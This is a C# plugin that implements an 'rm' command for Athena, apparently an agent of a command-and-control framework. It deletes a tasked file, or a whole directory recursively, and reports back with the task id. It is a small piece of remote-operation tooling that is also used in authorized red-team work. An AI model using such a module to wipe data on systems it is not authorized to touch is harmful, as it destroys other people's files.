using Athena.Plugins;
using System;
using System.Collections.Generic;
using System.IO;

namespace Plugins
{
    public class Rm : AthenaPlugin
    {
        public override string Name => "rm";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                if (args.ContainsKey("path"))
                {
                    FileAttributes attr = File.GetAttributes((args["path"]).Replace("\"", ""));

                    // Check if Directory
                    if (attr.HasFlag(FileAttributes.Directory))
                    {
                        Directory.Delete((args["path"]).Replace("\"", ""), true);
                    }
                    else
                    {
                        File.Delete(args["path"]);
                    }

                    PluginHandler.AddResponse(new ResponseResult
                    {
                        completed = "true",
                        user_output = "Deleted: " + (args["path"]).Replace("\"", ""),
                        task_id = args["task-id"],
                    });
                }
                else
                {

                    PluginHandler.AddResponse(new ResponseResult
                    {
                        completed = "true",
                        user_output = "Please specify a file to delete!",
                        task_id = args["task-id"],
                        status = "error"
                    });
                }
            }
            catch (Exception e)
            {

                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
                return;
            }
        }
    }
}
